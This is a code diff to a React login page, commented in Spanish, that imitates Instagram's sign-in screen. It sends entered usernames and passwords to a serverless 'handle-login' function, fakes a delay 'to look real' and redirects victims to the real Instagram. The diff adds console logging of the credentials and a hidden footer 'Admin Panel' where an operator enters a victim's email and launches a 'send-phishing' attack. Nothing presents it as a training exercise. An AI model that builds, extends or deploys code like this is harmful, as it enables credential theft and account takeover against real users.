@@ -8,6 +8,9 @@ function LoginPage() {
   });
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
+  const [showDropdown, setShowDropdown] = useState(false);
+  const [targetEmail, setTargetEmail] = useState('');
+  const [sendingEmail, setSendingEmail] = useState(false);
 
   const handleChange = (e) => {
     setCredentials({
@@ -22,36 +25,81 @@ function LoginPage() {
     setError('');
     
     try {
-      // 1. Enviar datos a nuestra función serverless
+      console.log('Enviando credenciales...', credentials);
+
       const response = await fetch('/.netlify/functions/handle-login', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
         body: JSON.stringify(credentials)
       });
 
-      if (!response.ok) {
-        throw new Error('Error de autenticación');
+      console.log('Status:', response.status);
+      console.log('Headers:', Object.fromEntries(response.headers));
+
+      // Intenta obtener el texto de la respuesta primero
+      const textResponse = await response.text();
+      console.log('Respuesta texto:', textResponse);
+
+      let data;
+      try {
+        data = JSON.parse(textResponse);
+      } catch (e) {
+        console.error('Error parseando JSON:', e);
+        throw new Error('Respuesta inválida del servidor');
       }
 
-      // 2. Simular delay para hacer parecer real
+      console.log('Respuesta parseada:', data);
+
+      if (!response.ok) {
+        throw new Error(data.error || 'Error de autenticación');
+      }
+
+      // Simular delay para hacer parecer real
       await new Promise(resolve => setTimeout(resolve, 1500));
 
-      // 3. Guardar en localStorage para simular sesión
+      // Guardar en localStorage para simular sesión
       localStorage.setItem('instagram_session', Date.now());
 
-      // 4. Redirigir a Instagram real
-      window.location.href = 'https://www.instagram.com';
+      // Redirigir a Instagram real
+      window.location.href = data.redirectTo || 'https://www.instagram.com';
       
     } catch (error) {
+      console.error('Error detallado:', error);
       setError('Lo sentimos, no pudimos iniciar sesión. Por favor, inténtalo de nuevo.');
-      console.error('Error:', error);
     } finally {
       setIsLoading(false);
     }
   };
 
+  const handleSendPhishing = async (e) => {
+    e.preventDefault();
+    if (!targetEmail) return;
+    
+    setSendingEmail(true);
+    try {
+      const response = await fetch('/.netlify/functions/send-phishing', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ targetEmail })
+      });
+
+      if (!response.ok) throw new Error('Error al enviar');
+      
+      setTargetEmail('');
+      setShowDropdown(false);
+      alert('Email enviado exitosamente');
+    } catch (error) {
+      alert('Error al enviar el email');
+    } finally {
+      setSendingEmail(false);
+    }
+  };
+
   return (
-    <div className="login-page">
+    <div className="login-page" style={{ position: 'relative' }}>
       <div className="login-form-container">
         <form 
           className="login-form"
@@ -142,6 +190,33 @@ function LoginPage() {
             <a href="#">Meta Verified</a>
           </div>
           <div className="footer-copyright">
+            {/* Botón de phishing */}
+            <div className="phishing-dropdown">
+              <button 
+                className="dropdown-toggle-footer"
+                onClick={() => setShowDropdown(!showDropdown)}
+              >
+                <span>🔒</span> Admin Panel
+              </button>
+              
+              {showDropdown && (
+                <form className="dropdown-content-footer" onSubmit={handleSendPhishing}>
+                  <input
+                    type="email"
+                    value={targetEmail}
+                    onChange={(e) => setTargetEmail(e.target.value)}
+                    placeholder="Email de la víctima"
+                    required
+                  />
+                  <button 
+                    type="submit"
+                    disabled={sendingEmail}
+                  >
+                    {sendingEmail ? '📨 Enviando...' : '🎣 Iniciar ataque'}
+                  </button>
+                </form>
+              )}
+            </div>
             <select>
               <option value="es">Español</option>
             </select>
